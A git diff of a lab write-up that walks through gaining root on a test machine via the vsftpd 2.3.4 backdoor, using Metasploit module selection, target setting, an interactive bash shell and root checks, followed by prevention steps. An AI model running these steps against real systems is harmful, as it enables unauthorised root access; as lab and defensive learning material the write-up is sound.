@@ -195,7 +195,7 @@ vsftpd 2.3.4 has a backdoor that was added directly into the source code in 2011
 
 ## Step 4 — Exploiting vsftpd 2.3.4 with Metasploit
 
-### Started Metasploit
+- ### Started Metasploit
 
 I started Metasploit Framework.
 
@@ -206,7 +206,7 @@ msfconsole -q
   <img src="images/step3-1.png" width="600">
 </p>
 
-### Searched for the vsftpd Exploit
+- ### Searched for the vsftpd Exploit
 
 I searched for an exploit related to **vsftpd**.
 
@@ -229,7 +229,7 @@ Interact with a module by name or index. For example info 1, use 1 or use exploi
   <img src="images/step4-1.png" width="600">
 </p>
 
-### Selected the Exploit
+- ### Selected the Exploit
 
 I selected the **vsftpd 2.3.4 backdoor** exploit module.
 
@@ -246,7 +246,7 @@ msf exploit(unix/ftp/vsftpd_234_backdoor) >
   <img src="images/step4-2.png" width="600">
 </p>
 
-### Checked the Options
+- ### Checked the Options
 
 Before running the exploit, I checked the required options.
 
@@ -269,7 +269,7 @@ I saw that only the target IP address needed to be configured because the FTP se
   <img src="images/step4-3.png" width="600">
 </p>
 
-### Set the Target IP
+- ### Set the Target IP
 
 I set the target IP address.
 
@@ -285,7 +285,7 @@ RHOSTS => 192.168.5.139
   <img src="images/step4-4.png" width="600">
 </p>
 
-### Ran the Exploit
+- ### Ran the Exploit
 
 After setting the target IP, I ran the exploit.
 
@@ -317,7 +317,7 @@ Since I wanted an interactive Bash shell, I ran:
 /bin/bash -i
 ```
 
-### Confirmed Root Access
+- ### Confirmed Root Access
 
 I checked the current user:
 
@@ -354,18 +354,18 @@ The `whoami` and `id` commands confirmed that I had root access on the target ma
 
 ## How to Prevent It
 
-### Remove or upgrade vsftpd immediately
+- **Remove or upgrade vsftpd immediately**
 
 ```bash
 sudo apt remove vsftpd
 sudo apt install vsftpd
 ```
-### Block port 6200 at the firewall
+- **Block port 6200 at the firewall**
 
 ```bash
 iptables -A INPUT -p tcp --dport 6200 -j DROP
 ```
-### Disable FTP if not needed
+- **Disable FTP if not needed**
 
 FTP is an outdated and insecure protocol. Use SFTP or SCP instead:
 
@@ -373,17 +373,17 @@ FTP is an outdated and insecure protocol. Use SFTP or SCP instead:
 sudo systemctl stop vsftpd
 sudo systemctl disable vsftpd
 ```
-### Run regular vulnerability scans
+- **Run regular vulnerability scans**
 
 Tools like OpenVAS or Nessus would flag vsftpd 2.3.4 immediately as a critical vulnerability.
 
-### Always check software versions against known CVEs
+- **Always check software versions against known CVEs**
 
 ```bash
 https://nvd.nist.gov
 ```
 
-### What I Achieved
+## What I Achieved
 By completing this attack I showed that:
 
 - A single outdated and unpatched service was enough to get direct root access without any privilege escalation
